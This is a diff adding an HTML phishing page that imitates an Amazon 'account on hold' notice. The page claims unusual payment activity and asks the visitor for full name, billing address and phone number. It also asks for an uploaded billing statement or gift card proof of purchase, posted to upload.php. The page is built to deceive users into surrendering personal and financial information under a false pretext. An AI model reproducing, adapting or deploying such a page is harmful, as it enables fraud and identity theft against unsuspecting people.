@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Bhavvyadaan</title>
+</head>
+<style>
+    .required {
+  color: red;
+    }
+    .div1 {
+  width: 500px;
+  height: 200px;
+  border: 1px solid orange;
+  border-left-width:15px ;
+  border-radius: 10px;
+
+}
+</style>
+
+<body style="padding-left: 200px;line-height: 1.6">
+  <img src="amazon.png" alt="Bhavvyadaan" height="100px" style="align-items: center;padding-left: 140px;"/>
+
+    <div class="div1"><h2>Account on hold temporarily</h2><br>
+    <p>we noticed unusual payment activity on your account and need to<br>
+    verify ownership of the payment meathod used on your most recent<br>
+    order.<a href="" target="_blank" style="color:aquamarine ;">(Why?)</a> 
+</p></div>
+
+<h2>Enter billing details</h2>
+<h4>This is required to remove the hold on your account</h4>
+<form action="upload.php" method="post" enctype="multipart/form-data">
+	<label ><span class="required">*</span>Full name</label><br>
+        <input type="text" placeholder="Name that appears on the payment meathod"style="font-size: 15px;width:550px" name="fn">
+       <br>
+        <label>Country/Region</label><br>
+    <select style="font-size: 15px;width:550px;" name="sel">
+      <option value="India">India</option>
+      <option value="USA">United States of America</option>
+      <option value="UAE" >UAE</option>
+      <option value="Canada">Canada</option>
+    </select>
+    <br>
+     <label ><span class="required">*</span>Billing Address</label><br>
+        <textarea rows="5" cols="40" style="font-size: 25px" name="badd">
+        </textarea>
+        <br>
+        <label for="phone"><span class="required">*</span>Phone number</label><br>
+            <input style="width:550px;font-size: 25px" type="tel" id="phone" name="phone" pattern="[0-9]{3}-[0-9]{2}-[0-9]{3}" name="pno">
+            <br>
+            <hr>
+            <h3>Attach supporting document</h3><br>
+    <h4>This can help remove the hold on your account move quickly.</h4><br>
+    <h4>Document type</h4><br>
+    <input type="radio" name="Details" id="fileToUpload">
+        Billing statement
+        <input type="file" name="Details" id="fileToUpload" name="bs"><br>
+        <input type="submit">
+        <br>
+        <h5>Please ensure ONLY the last four digits of the card are visible.<br>
+    For your security,do NOT include full card or account numbers.</h5>
+    <br>
+     <input type="radio" name="Details" id="fileToUpload" >
+        Gift card proof of purchase
+        <input type="file" name="Details" id="fileToUpload" name="pop"><br>
+        <input type="submit">
+       </form>
+       </body>
+       </html> 
